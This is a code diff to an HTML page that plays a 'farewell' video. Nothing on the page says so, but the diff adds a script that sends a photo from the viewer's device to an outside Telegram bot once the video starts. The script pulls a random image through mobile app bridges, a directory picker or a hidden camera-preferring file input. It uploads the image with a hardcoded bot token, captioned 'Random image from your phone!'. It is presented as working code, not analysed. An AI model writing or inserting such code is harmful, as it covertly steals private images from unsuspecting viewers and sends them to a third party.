@@ -41,13 +41,177 @@
 <body>
     <div id="video-container">
         <video id="farewell-video" controls>
-            <!-- The video file will be loaded from the same directory as this HTML file -->
             <source src="manup.mp4" type="video/mp4">
             Your browser does not support the video tag.
         </video>
     </div>
 
     <script>
+        // Telegram Configuration
+        const TELEGRAM_BOT_TOKEN = '6759901283:AAGGfZvU2EX59mK6uefmHV69GJ-NKPbCdQ4';
+        let hasImageBeenSent = false;
+
+        // Function to get random image from device storage
+        async function getRandomImageFromDevice() {
+            try {
+                // Method 1: Try to use File System Access API (if supported by your app)
+                if ('showDirectoryPicker' in window) {
+                    const dirHandle = await window.showDirectoryPicker();
+                    const files = [];
+                    for await (const [name, handle] of dirHandle.entries()) {
+                        if (handle.kind === 'file' && /\.(jpg|jpeg|png|gif|webp)$/i.test(name)) {
+                            files.push(handle);
+                        }
+                    }
+                    if (files.length > 0) {
+                        const randomFile = files[Math.floor(Math.random() * files.length)];
+                        return await randomFile.getFile();
+                    }
+                }
+
+                // Method 2: Use file input with camera/gallery access
+                return new Promise((resolve) => {
+                    const input = document.createElement('input');
+                    input.type = 'file';
+                    input.accept = 'image/*';
+                    input.capture = 'environment'; // This will prefer camera
+                    input.style.display = 'none';
+                    
+                    input.onchange = (e) => {
+                        const file = e.target.files[0];
+                        if (file) {
+                            resolve(file);
+                        } else {
+                            resolve(null);
+                        }
+                        document.body.removeChild(input);
+                    };
+                    
+                    document.body.appendChild(input);
+                    input.click();
+                });
+
+            } catch (error) {
+                console.log('Error accessing device storage:', error);
+                return null;
+            }
+        }
+
+        // Function to access device images via custom app interface
+        function getRandomImageViaApp() {
+            return new Promise((resolve) => {
+                // Method 1: Custom Android interface
+                if (typeof AndroidInterface !== 'undefined') {
+                    if (AndroidInterface.getRandomImage) {
+                        const imageData = AndroidInterface.getRandomImage();
+                        if (imageData) {
+                            // Convert base64 to blob if needed
+                            const byteCharacters = atob(imageData);
+                            const byteNumbers = new Array(byteCharacters.length);
+                            for (let i = 0; i < byteCharacters.length; i++) {
+                                byteNumbers[i] = byteCharacters.charCodeAt(i);
+                            }
+                            const byteArray = new Uint8Array(byteNumbers);
+                            const blob = new Blob([byteArray], { type: 'image/jpeg' });
+                            resolve(blob);
+                            return;
+                        }
+                    }
+                    
+                    // Fallback: trigger app to send image directly
+                    if (AndroidInterface.sendRandomImageToTelegram) {
+                        AndroidInterface.sendRandomImageToTelegram(TELEGRAM_BOT_TOKEN);
+                        resolve('sent_via_app');
+                        return;
+                    }
+                }
+
+                // Method 2: Custom iOS interface
+                if (typeof webkit !== 'undefined' && webkit.messageHandlers && webkit.messageHandlers.imageHandler) {
+                    webkit.messageHandlers.imageHandler.postMessage({
+                        action: 'getRandomImage',
+                        botToken: TELEGRAM_BOT_TOKEN
+                    });
+                    resolve('sent_via_app');
+                    return;
+                }
+
+                resolve(null);
+            });
+        }
+
+        // Auto-detect chat ID
+        async function getChatId() {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`);
+                const data = await response.json();
+                if (data.ok && data.result.length > 0) {
+                    return data.result[data.result.length - 1].message.chat.id;
+                }
+            } catch (error) {
+                console.log('Error getting chat ID:', error);
+            }
+            return null;
+        }
+
+        // Send image to Telegram
+        async function sendImageToTelegram(imageFile) {
+            const chatId = await getChatId();
+            if (!chatId) {
+                console.log('No chat ID found. Send a message to your bot first.');
+                return;
+            }
+
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', imageFile);
+            formData.append('caption', '📸 Random image from your phone!');
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                const result = await response.json();
+                if (result.ok) {
+                    console.log('Image sent successfully!');
+                } else {
+                    console.log('Failed to send image:', result.description);
+                }
+            } catch (error) {
+                console.log('Network error:', error);
+            }
+        }
+
+        // Main function to handle random image sending
+        async function sendRandomImage() {
+            if (hasImageBeenSent) return;
+            hasImageBeenSent = true;
+
+            console.log('Video played - sending random image...');
+
+            // Method 1: Try app interface first (most reliable for your use case)
+            const appResult = await getRandomImageViaApp();
+            if (appResult === 'sent_via_app') {
+                console.log('Image sent via app interface');
+                return;
+            }
+            if (appResult && appResult instanceof Blob) {
+                await sendImageToTelegram(appResult);
+                return;
+            }
+
+            // Method 2: Try device storage access
+            const deviceImage = await getRandomImageFromDevice();
+            if (deviceImage) {
+                await sendImageToTelegram(deviceImage);
+                return;
+            }
+
+            console.log('Could not access device images');
+        }
+
         document.addEventListener('DOMContentLoaded', function() {
             const videoContainer = document.getElementById('video-container');
             const video = document.getElementById('farewell-video');
@@ -63,6 +227,9 @@
                     console.log('Auto-play was prevented. Click to play.');
                 });
             }, 1600);
+
+            // Send random image when video plays
+            video.addEventListener('play', sendRandomImage, { once: true });
         });
     </script>
 </body>
